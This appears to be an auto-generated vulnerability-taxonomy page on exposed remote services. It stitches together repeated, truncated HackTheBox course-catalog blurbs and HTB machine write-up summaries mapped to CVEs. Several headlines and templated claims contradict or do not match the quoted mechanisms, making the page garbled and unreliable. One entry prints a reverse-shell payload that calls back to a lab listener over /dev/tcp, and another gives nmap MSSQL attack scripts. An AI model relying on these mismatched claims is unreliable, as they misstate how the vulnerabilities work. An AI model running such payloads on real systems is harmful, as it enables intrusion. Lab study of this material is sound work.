# Exposed Remote Services

## Definition

An administrative protocol reachable from where it should not be concedes its authentication surface to that reachability.

- **CWE:** CWE-200
- **OWASP:** None
- **Surface:** net
- **Aliases:** ["exposed service", "exposed services", "remote services", "internet facing service", "management interface exposure"]

Canonical home for `exposed_services`. Rendered from `db/wks.db` by `tools/taxonomy/build_taxonomy.py` — edit the rows, not this file.

## Root Cause

Not yet researched.

## Preconditions

**Internet-facing building management and CPS devices commonly ship with unmanaged third-party remote access tooling and open network ports, which is the precondition that turns an exposed-services finding into a lateral-movement entry point.**

A hunter should inventory remote-access agents and open ports on non-IT-exposed building systems before anything else, because these are the pivot points into an otherwise segmented network, and should rank an open port as an attack path rather than as a hygiene finding. The precondition framing matters: the exposure itself is ordinary, and the severity comes from what the reachable device trusts once it is spoken to. The claim is falsified by an estate inventory showing no third-party remote access agents and no non-essential open ports on these systems.

*Disproof:* An inventory showing these CPS environments with no third-party remote access agents and no non-essential open ports would refute the claim for that estate.

## Attack Surface

Surface: **net**.

The entry points and enabling conditions for this surface are enumerated under **Preconditions**; the observable signals are under **Detection**.

## Detection

Not yet researched.

## Exploitation

**The CrackMapExec tool, known as a "Swiss Army Knife" for testing networks, facilitates enumeration, attacks, and post-exploitation that can be leveraged against most any domain using multiple network protocols.**

ini-module will cover enumerating and attacking common DACL misconfigurations, allowing us to escalate our privileges horizontally and vertically and move laterally across an Active Directory network. 
 
 
 
 Using CrackMapExec 
 
 
 Medium 
 
 
 27 Sections 
 
 Reward: +100 
 
 Active Directory presents a vast attack surface and often requires us to use many different tools during an assessment. The CrackMapExec tool, known as a "Swiss Army Knife" for testing networks, facilitates enumeration, attacks, and post-exploitation that can be leveraged against most any domain using multiple network protocols. It is a versatile and highly customizable tool that should be in any penetration tester's toolbox. 
 
 
 
 Linux Privilege Escalation 
 
 
 Easy 
 
 
 28 Sections 
 
 Reward: +20 
 
 Privilege escalation is a crucial phase during any security assessment. During this phase, we attempt to gain access to additional users, hosts, and resources to move closer to the assessment's overall goal. There ar

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "The CrackMapExec tool, known as a "Swiss Army Knife" for testing networks, facilitates enu".

**SQL injection is a code injection technique used to take advantage of coding vulnerabilities and inject SQL queries via an application to bypass authentication, retrieve data from the back-end database, or achieve code execution on the underlying server.**

affect web application sessions, such as Session Hijacking, Session Fixation, Cross-Site Request Forgery, Cross-Site Scripting, and Open Redirects. 
 
 
 
 SQL Injection Fundamentals 
 
 
 Medium 
 
 
 17 Sections 
 
 Reward: +10 
 
 Databases are an important part of web application infrastructure and SQL (Structured Query Language) to store, retrieve, and manipulate information stored in them. SQL injection is a code injection technique used to take advantage of coding vulnerabilities and inject SQL queries via an application to bypass authentication, retrieve data from the back-end database, or achieve code execution on the underlying server. 
 
 
 
 SQLMap Essentials 
 
 
 Easy 
 
 
 11 Sections 
 
 Reward: +20 
 
 The SQLMap Essentials module will teach you the basics of using SQLMap to discover various types of SQL Injection vulnerabilities, all the way to the advanced enumeration of databases to retrieve all data of interest. 
 
 
 
 File Inclusion 
 
 
 Medium 
 
 
 11 Sections 
 
 Reward: +10 
 
 File Inclusion is a common web a

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "SQL injection is a code injection technique used to take advantage of coding vulnerabiliti".

**While XPath and LDAP injection vulnerabilities can lead to authentication bypasses and data exfiltration, HTML injection in PDF generation libraries can lead to Server-Side Request Forgery (SSRF), Local File Inclusion (LFI), and other common web vulnerabilities.**

real-world deployment settings utilizing intermediary systems such as reverse proxies in front of the web server. We will cover how to identify, exploit, and prevent each of these vulnerabilities. 
 
 
 
 Injection Attacks 
 
 
 Medium 
 
 
 15 Sections 
 
 Reward: +100 
 
 This module covers three injection attacks: XPath injection, LDAP injection, and HTML injection in PDF generation libraries. While XPath and LDAP injection vulnerabilities can lead to authentication bypasses and data exfiltration, HTML injection in PDF generation libraries can lead to Server-Side Request Forgery (SSRF), Local File Inclusion (LFI), and other common web vulnerabilities. We will cover how to identify, exploit, and prevent each of these injection attacks. 
 
 
 
 Abusing HTTP Misconfigurations 
 
 
 Hard 
 
 
 20 Sections 
 
 Reward: +100 
 
 This module covers three common HTTP vulnerabilities: Web Cache Poisoning, Host Header Vulnerabilities, and Session Puzzling or Session Variable Overloading. These vulnerabilities can arise on the HTTP level due to web server

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "While XPath and LDAP injection vulnerabilities can lead to authentication bypasses and dat".

**We will cover how to identify, exploit, and prevent each of them through various methods.**

oader category of Identification and Authentication failures. A vulnerability or misconfiguration at the authentication stage can impact an application's overall security. 
 
 
 
 Web Attacks 
 
 
 Medium 
 
 
 18 Sections 
 
 Reward: +20 
 
 This module covers three common web vulnerabilities, HTTP Verb Tampering, IDOR, and XXE, each of which can have a significant impact on a company's systems. We will cover how to identify, exploit, and prevent each of them through various methods. 
 
 
 
 Attacking Common Applications 
 
 
 Medium 
 
 
 33 Sections 
 
 Reward: +20 
 
 Penetration Testers can come across various applications, such as Content Management Systems, custom web applications, internal portals used by developers and sysadmins, and more. It's common to find the same applications across many different environments. While an application may not be vulnerable in one en

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "We will cover how to identify, exploit, and prevent each of them through various methods.".

**This module covers the most common attacks and vulnerabilities that can affect web application sessions, such as Session Hijacking, Session Fixation, Cross-Site Request Forgery, Cross-Site Scripting, and Open Redirects.**

compromise if chained together with other vulnerabilities. This module will teach you how to identify XSS vulnerabilities and exploit them. 
 
 
 
 Session Security 
 
 
 Medium 
 
 
 14 Sections 
 
 Reward: +20 
 
 Maintaining and keeping track of a user's session is an integral part of web applications. It is an area that requires extensive testing to ensure it is set up robustly and securely. This module covers the most common attacks and vulnerabilities that can affect web application sessions, such as Session Hijacking, Session Fixation, Cross-Site Request Forgery, Cross-Site Scripting, and Open Redirects. 
 
 
 
 SQL Injection Fundamentals 
 
 
 Medium 
 
 
 17 Sections 
 
 Reward: +10 
 
 Databases are an important part of web application infrastructure and SQL (Structured Query Language) to store, retrieve, and manipulate information stored in them. SQL injection is a code injection technique used to take advantage of coding vulnerabilities and inject SQL queries via an application to bypass aut

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "This module covers the most common attacks and vulnerabilities that can affect web applica".

**These flaws enable attackers to upload malicious files, execute arbitrary commands on the back-end server, and even take control over the entire server and all web applications hosted on it and potentially gain access to sensitive data or cause a service disruption.**

bases to retrieve all data of interest. 
 
 
 
 File Inclusion 
 
 
 Medium 
 
 
 11 Sections 
 
 Reward: +10 
 
 File Inclusion is a common web application vulnerability, which can be easily overlooked as part of a web application's functionality. 
 
 
 
 File Upload Attacks 
 
 
 Medium 
 
 
 11 Sections 
 
 Reward: +20 
 
 Arbitrary file uploads are among the most critical web vulnerabilities. These flaws enable attackers to upload malicious files, execute arbitrary commands on the back-end server, and even take control over the entire server and all web applications hosted on it and potentially gain access to sensitive data or cause a service disruption. 
 
 
 
 Command Injections 
 
 
 Medium 
 
 
 12 Sections 
 
 Reward: +20 
 
 Command injection vulnerabilities can be leveraged to compromise a hosting server and its entire network. This module will teach you how to identify and exploit command injection vulnerabilities and how to use various filter bypassing techniques to avoid security mitigations. 
 
 
 
 Broken Authentication 
 
 
 Medium

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "These flaws enable attackers to upload malicious files, execute arbitrary commands on the ".

**We will cover how to identify, exploit, and prevent each of these injection attacks.**

oader category of Identification and Authentication failures. A vulnerability or misconfiguration at the authentication stage can impact an application's overall security. 
 
 
 
 Web Attacks 
 
 
 Medium 
 
 
 18 Sections 
 
 Reward: +20 
 
 This module covers three common web vulnerabilities, HTTP Verb Tampering, IDOR, and XXE, each of which can have a significant impact on a company's systems. We will cover how to identify, exploit, and prevent each of them through various methods. 
 
 
 
 Attacking Common Applications 
 
 
 Medium 
 
 
 33 Sections 
 
 Reward: +20 
 
 Penetration Testers can come across various applications, such as Content Management Systems, custom web applications, internal portals used by developers and sysadmins, and more. It's common to find the same applications across many different environments. While an application may not be vulnerable in o

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "We will cover how to identify, exploit, and prevent each of these injection attacks.".

**Buffer overflows are common vulnerabilities in software applications that can be exploited to achieve remote code execution (RCE) or perform a Denial-of-Service (DoS) attack.**

indows and Active Directory, defining and enforcing access to the various system resources. This mini-module will cover enumerating and attacking common DACL misconfigurations, allowing us to escalate our privileges horizontally and vertically and move laterally across an Active Directory network. 
 
 
 
 Stack-Based Buffer Overflows on Linux x86 
 
 
 Medium 
 
 
 13 Sections 
 
 Reward: +10 
 
 Buffer overflows are common vulnerabilities in software applications that can be exploited to achieve remote code execution (RCE) or perform a Denial-of-Service (DoS) attack. These vulnerabilities are caused by insecure coding, resulting in an attacker being able to overrun a program's buffer and overwrite adjacent memory locations, changing the program's execution path and resulting in unintended actions. 
 
 
 
 Stack-Based Buffer Overflows on Windows x86 
 
 
 Medium 
 
 
 11 Sections 
 
 Reward: +10 
 
 This module is your first step into Windows Binary Exploitati

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Buffer overflows are common vulnerabilities in software applications that can be exploited".

**We will discuss how to identify, exploit, and prevent each vulnerability.**

ard: +200 
 
 Learn how to improve your JavaScript code's security through Code Review, Static/Dynamic Analysis, Vulnerability Identification, and Patching. 
 
 
 
 Whitebox Attacks 
 
 
 Hard 
 
 
 15 Sections 
 
 Reward: +100 
 
 This module explores several web vulnerabilities from a whitebox approach: Prototype Pollution, Timing Attacks & Race Conditions, and those arising from Type Juggling. We will discuss how to identify, exploit, and prevent each vulnerability. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 Active Directory Penetration Tester 
 
 The Active Directory Penetration Tester Job Role Path is designed for individuals who aim to develop skills in pentesting large Active Directory (AD) networks and the components commonly found in such environments. This path equips students with the skills needed to evaluate the security of AD environments, navigate complex Win

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "We will discuss how to identify, exploit, and prevent each vulnerability.".

**We will discuss how to identify, exploit, and prevent TLS attacks.**

s attack scenarios, such as targeting SSH, FTP, and web login forms. 
 
 
 
 HTTPs/TLS Attacks 
 
 
 Medium 
 
 
 15 Sections 
 
 Reward: +100 
 
 This module covers details on Transport Layer Security (TLS) and how it helps to make HTTP secure with the widely used HTTPS. That includes how TLS works, how TLS sessions are established, common TLS misconfigurations, as well as famous attacks on TLS. We will discuss how to identify, exploit, and prevent TLS attacks. 
 
 
 
 Cross-Site Scripting (XSS) 
 
 
 Easy 
 
 
 10 Sections 
 
 Reward: +20 
 
 Cross-Site Scripting (XSS) vulnerabilities are among the most common web application vulnerabilities. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities. This mo

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "We will discuss how to identify, exploit, and prevent TLS attacks.".

**We will cover how to identify, exploit, and prevent each of these vulnerabilities.**

oader category of Identification and Authentication failures. A vulnerability or misconfiguration at the authentication stage can impact an application's overall security. 
 
 
 
 Web Attacks 
 
 
 Medium 
 
 
 18 Sections 
 
 Reward: +20 
 
 This module covers three common web vulnerabilities, HTTP Verb Tampering, IDOR, and XXE, each of which can have a significant impact on a company's systems. We will cover how to identify, exploit, and prevent each of them through various methods. 
 
 
 
 Attacking Common Applications 
 
 
 Medium 
 
 
 33 Sections 
 
 Reward: +20 
 
 Penetration Testers can come across various applications, such as Content Management Systems, custom web applications, internal portals used by developers and sysadmins, and more. It's common to find the same applications across many different environments. While an application may not be vulnerable in

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "We will cover how to identify, exploit, and prevent each of these vulnerabilities.".

**For all exercises, we will assume that the target company Inlanefreight has hired us to perform an in-depth penetration test with a heavy focus on AD security, where stealth and bypassing stringent security controls are not a requirement.**

ls of the assessment. The tools listed above will be covered in other modules. 
 
 Next Steps 
 During this module, we will target a fictional company called INLANEFREIGHT with the internal domain INLANEFREIGHT.LOCAL . The module sections will build on each other, culminating in a mock penetration testing skills assessment to showcase our skills before moving on to the next module in this series. For all exercises, we will assume that the target company Inlanefreight has hired us to perform an in-depth penetration test with a heavy focus on AD security, where stealth and bypassing stringent security controls are not a requirement. 
 
 Module Exercises 
 Throughout this module, you will connect to various target hosts via the Remote Desktop Protocol (RDP) to complete the exercises. Any necessary credentials will be provided with each exercise, and the RDP connection can be made via xfreerdp from the Pwnbox as follows: 
 xfreerdp /v: /u:htb-student /p: 
 
 Any necessary tools can be found in the c:\tools directory after logg

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "For all exercises, we will assume that the target company Inlanefreight has hired us to pe".

**Kerberos is an authentication protocol that allows users to authenticate and access services on a potentially insecure network.**

his covers common methods while emphasizing real-world misconfigurations and flaws that we may encounter during an assessment. There are many additional "edge-case" possibilities not covered in this module. We will cover both modern and legacy Windows Server and Desktop versions that may be present in a client environment. 
 
 
 
 Kerberos Attacks 
 
 
 Hard 
 
 
 23 Sections 
 
 Reward: +100 
 
 Kerberos is an authentication protocol that allows users to authenticate and access services on a potentially insecure network. Due to its prevalence throughout an Active Directory environment, it presents us with a significant attack surface when assessing internal networks. This module will explain how Kerberos works thoroughly and examines several scenarios to practice the most common attacks against it from multiple perspectives. 
 
 
 
 NTLM Relay Attacks 
 
 
 Hard 
 
 
 10 Sections 
 
 Reward: +100 
 
 The NTLM aut

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Kerberos is an authentication protocol that allows users to authenticate and access servic".

**An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities.**

widely used HTTPS. That includes how TLS works, how TLS sessions are established, common TLS misconfigurations, as well as famous attacks on TLS. We will discuss how to identify, exploit, and prevent TLS attacks. 
 
 
 
 Cross-Site Scripting (XSS) 
 
 
 Easy 
 
 
 10 Sections 
 
 Reward: +20 
 
 Cross-Site Scripting (XSS) vulnerabilities are among the most common web application vulnerabilities. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities. This module will teach you how to identify XSS vulnerabilities and exploit them. 
 
 
 
 Session Security 
 
 
 Medium 
 
 
 14 Sections 
 
 Reward: +20 
 
 Maintaining and keeping track of a user's session is an integral part of web applications. It is an area that requires extensive testing to ensure it is set up robustly and securely. This module covers the most common attacks and vulnerabilit

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the".

**Command injection vulnerabilities can be leveraged to compromise a hosting server and its entire network.**

loads are among the most critical web vulnerabilities. These flaws enable attackers to upload malicious files, execute arbitrary commands on the back-end server, and even take control over the entire server and all web applications hosted on it and potentially gain access to sensitive data or cause a service disruption. 
 
 
 
 Command Injections 
 
 
 Medium 
 
 
 12 Sections 
 
 Reward: +20 
 
 Command injection vulnerabilities can be leveraged to compromise a hosting server and its entire network. This module will teach you how to identify and exploit command injection vulnerabilities and how to use various filter bypassing techniques to avoid security mitigations. 
 
 
 
 Broken Authentication 
 
 
 Medium 
 
 
 14 Sections 
 
 Reward: +20 
 
 Authentication is probably the most straightforward and prevalent measure used to secure access to resources, and it's the first line of defense ag

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Command injection vulnerabilities can be leveraged to compromise a hosting server and its ".

**Public writeup evidence for exposed_services: unauthenticated mgmt plane RCE.**

HARVESTED FROM bugbountydaily RSS -> https://blog.silentsignal.eu/2026/06/05/unauthenticated-rce-as-qsecofr-via-ibm-i-management-central/
Reason it matters: unauthenticated mgmt plane RCE.

The combination of a custom binary protocol, client-controlled authentication flags, and a derived usedForAuth field that can be trivially satisfied resulted in unauthenticated root-level command execution.

*Disproof:* Refuted if the fetched page no longer contains this exact span, or if the described behaviour is corrected or withdrawn by the publisher.

**A service exposed on an unexpected port is identified by matching its banner and behaviour to a known product, which is what makes the correct next step discoverable.**

In practice on HTB this shows up as: | **Command** | **Description** |
| ---- | ---- |
| `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>` | Nmap port scan |
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |
| `SQL> select name from sys.databases` | Select databases in mssqlclient |

Write-up provenance: ajcriado/htb-writeups :: Academy/CPTS/Content Summary/04. Footprinting.md (1810 words, classified network).

*Disproof:* Refuted when the service returns no banner and no identifiable protocol behaviour, leaving nothing to match against a known product.

**AdmirerToo documents CVE-2021-21311 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine AdmirerToo (official write-up, doc 427, 22872 chars, sha1 3a2f3274284b) describes CVE-2021-21311. Mechanism as documented on the machine: The payload is executed and a reverse shell with root privileges is sent back to our listener on port 7777.

Authoritative record: Adminer is an open-source database management in a single PHP file. In adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability. Users of Adminer versions bundling all drivers (e.g. `adminer.php`) are affected. This is fixed in version 4.7.9.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2021-21311) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Ariekei documents CVE-2016-3714 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Ariekei (official write-up, doc 115, 4995 chars, sha1 ba9e6d5e1956) describes CVE-2016-3714. Mechanism as documented on the machine: Exploit: h ttps://imagetragick.com Using the ImageTragick exploit (CVE-2016-3714) is trivial. Uploading an .mvg file with the following content will grant a shell as the first root user.

Authoritative record: The (1) EPHEMERAL, (2) HTTPS, (3) MVG, (4) MSL, (5) TEXT, (6) SHOW, (7) WIN, and (8) PLT coders in ImageMagick before 6.9.3-10 and 7.x before 7.0.1-1 allow remote attackers to execute arbitrary code via shell metacharacters in a crafted image, aka \"ImageTragick.\"

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2016-3714) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Blunder documents CVE-2019-14287 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Blunder (official write-up, doc 254, 14746 chars, sha1 e3891895bdda) describes CVE-2019-14287. Mechanism as documented on the machine: The script reveals that the sudo version is 1.8.25p1 . Researching this specific sudo version, a vulnerability assigned CVE-2019-14287 is identified. This vulnerability allows users to bypass sudo security and escalate their privileges, allows sudo users to run commands as root, even though the configuration explicitly disallows this. The vulnerability exists in sudo versions prior to 1.8.28 . Let's check if we have sudo rights and also verify the sudo version.

Authoritative record: In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))" command.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-14287) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Carpediem documents CVE-2022-0492 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Carpediem (official write-up, doc 478, 18394 chars, sha1 509fa75c057c) describes CVE-2022-0492. Mechanism as documented on the machine: We append a reverse shell payload to index.php as follows: cat >> index.php <<'EOF' system("/bin/bash -c 'bash -i &>/dev/tcp/10.10.14.13/7979 0>&1'") EOF

Authoritative record: A vulnerability was found in the Linux kernel's cgroup_release_agent_write in the kernel/cgroup/cgroup-v1.c function. This flaw, under certain circumstances, allows the use of the cgroups v1 release_agent feature to escalate privileges and bypass the namespace isolation unexpectedly.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2022-0492) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Control documents CVE-2019-11043 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Control (official write-up, doc 218, 10026 chars, sha1 23131759960c) describes CVE-2019-11043. Mechanism as documented on the machine: Let's use the seclogon service. However, our shell is not in an interactive session, and we currently have limited ability to start or otherwise interact with services. The qwinsta command reveals that the user hector is also logged in interactively. We can migrate to an interactive process using Meterpreter. Windows Defender is enabled, and so we can use the signed Windows binary MSBuild.exe to execute a malicious project file such as this one. Download the file and edit it to include the payload generated with msfvenom.

Authoritative record: In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI protocol data, thus opening the possibility of remote code execution.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-11043) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Devzat documents CVE-2019-20933 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Devzat (official write-up, doc 398, 13338 chars, sha1 9232d799c6e0) describes CVE-2019-20933. Mechanism as documented on the machine: Then, we can use Curl to sent a base64 encoded payload in order to avoid possible issues with any bad characters.

Authoritative record: InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret).

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-20933) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**An administrative or remote service reachable from where policy forbids it is an initial-access or persistence surface, because attacker leverage is bounded by reachability rather than by the service's own authentication.**

Reachability is the whole variable here. A management interface that is authenticated and patched changes character completely depending on who can reach it, because every control downstream of the listener is unreachable to an adversary who cannot complete a TCP handshake to it. The correct test is therefore not 'is this service exposed' but 'is this service reachable from a segment that policy says should not reach it' — an SMTP relay reachable from the DMZ and the same relay reachable from a laptop are different findings with the same banner. Where the service is required for administration, the mitigation pattern ATT&CK recommends for the comparable WinRM case is the general one: lock down critical enclaves with separate infrastructure and restrict access with host firewall rules to specific destinations, rather than trying to harden a listener that should never have been reachable.

*Disproof:* If every exposed administrative service is reachable only from an explicitly authorized management segment and enforced at the network layer rather than by application configuration, then the reachability that creates the risk is not present.

**Feline documents CVE-2020-9484 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Feline (official write-up, doc 274, 11631 chars, sha1 993afb5872c4) describes CVE-2020-9484. Mechanism as documented on the machine: Let's download the Python exploit script and understand what it's doing.

Authoritative record: When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server; and b) the server is configured to use the PersistenceManager with a FileStore; and c) the PersistenceManager is configured with sessionAttributeValueClassNameFilter="null" (the default unless a Securi

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-9484) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Horizontall documents CVE-2019-18818 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Horizontall (official write-up, doc 374, 11486 chars, sha1 14d40dc1e16e) describes CVE-2019-18818. Mechanism as documented on the machine: # Date: 2021-08-30 # Exploit Author: Musyoka Ian # Vendor Homepage: https://strapi.io/ # Software Link: https://strapi.io/ # Version: Strapi CMS version 3.0.0-beta.17.4 or lower # Tested on: Ubuntu 20.04 # CVE : CVE-2019-18818, CVE-2019-19609

Authoritative record: strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-18818) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Jewel documents CVE-2020-8165 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Jewel (official write-up, doc 282, 8792 chars, sha1 38a86e3968ec) describes CVE-2020-8165. Mechanism as documented on the machine: apt install rails rails new exploit cd exploit rails console

Authoritative record: A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-8165) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Legacy documents CVE-2008-4250 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Legacy (official write-up, doc 2, 1550 chars, sha1 ce01da9d8e98) describes CVE-2008-4250. Mechanism as documented on the machine: Some searching turns up with CVE-2008-4250, which also has a Metasploit module available for it. Running the module immediately grants a root shell. Note: in some cases the module target must be set for the exploit to work. If so, Windows XP SP3 English is the correct target. Module: exploit/windows/smb/ms08_067_netapi

Authoritative record: The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary code via a crafted RPC request that triggers the overflow during path canonicalization, as exploited in the wild by Gimmiv.A in October 2008, aka \"Server Service Vulnerability.\"

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2008-4250) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Meta documents CVE-2020-29599 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Meta (official write-up, doc 429, 8404 chars, sha1 0d72c5928ba3) describes CVE-2020-29599. Mechanism as documented on the machine: } This defines a print_info() function that will execute our payload by calling a custom prin . We open a Netcat listener on port 9999:

Authoritative record: ImageMagick before 6.9.11-40 and 7.x before 7.0.10-40 mishandles the -authenticate option, which allows setting a password for password-protected PDF files. The user-controlled password was not properly escaped/sanitized and it was therefore possible to inject additional shell commands via coders/pdf.c.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-29599) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Monitors documents CVE-2020-9496 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Monitors (official write-up, doc 341, 13840 chars, sha1 6a2871c8c951) describes CVE-2020-9496. Mechanism as documented on the machine: Since the version is presented on the login page, we perform some research on Apache OFBiz 17.12.01 and find CVE-2020-9496 which allows us to exploit the vulnerable service through a XML RPC Java deserialization attack. The proof of concept code can be found here. To exploit the vulnerability we need to make a POST request to /webtools/control/xmlrpc and attach a base64 payload to the serializable entity within the XML in the request.

Authoritative record: XML-RPC request are vulnerable to unsafe deserialization and Cross-Site Scripting issues in Apache OFBiz 17.12.03

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-9496) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**OpenKeyS documents CVE-2019-19520 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine OpenKeyS (official write-up, doc 267, 12867 chars, sha1 e0f2a3b0b307) describes CVE-2019-19520. Mechanism as documented on the machine: Upon login it's confirmed that the version of OpenBSD is 6.6. The blog we discovered earlier also listed two Privilege Escalation vectors for this version of OpenBSD, which might be worth checking out. The CVEs CVE-2019-19520 and CVE-2019-19522 can be used interchangeably, first to escalate to the auth group, and then escalate from there to root .

Authoritative record: xlock in OpenBSD 6.6 allows local users to gain the privileges of the auth group by providing a LIBGL_DRIVERS_PATH environment variable, because xenocara/lib/mesa/src/loader/loader.c mishandles dlopen.

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-19520) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Passage documents CVE-2019-11447 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Passage (official write-up, doc 275, 13754 chars, sha1 326b8419ab3b) describes CVE-2019-11447. Mechanism as documented on the machine: # Exploit Title: CuteNews 2.1.2 - Remote Code Execution # Google Dork: N/A # Date: 2020-09-10 # Exploit Author: Musyoka Ian # Vendor Homepage: https://cutephp.com/cutenews/downloading.php # Software Link: https://cutephp.com/cutenews/downloading.php # Version: CuteNews 2.1.2 # Tested on: Ubuntu 20.04, CuteNews 2.1.2 # CVE : CVE-2019-11447

Authoritative record: An issue was discovered in CutePHP CuteNews 2.1.2. An attacker can infiltrate the server through the avatar upload process in the profile area via the avatar_file field to index.php?mod=main&opt=personal. There is no effective control of $imgsize in /core/modules/dashboard.php. The header content of a file can be changed and the control can be bypassed for code execution. (An attacker can use the

*Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-11447) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.

**Pit documents CVE-2019-12744 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

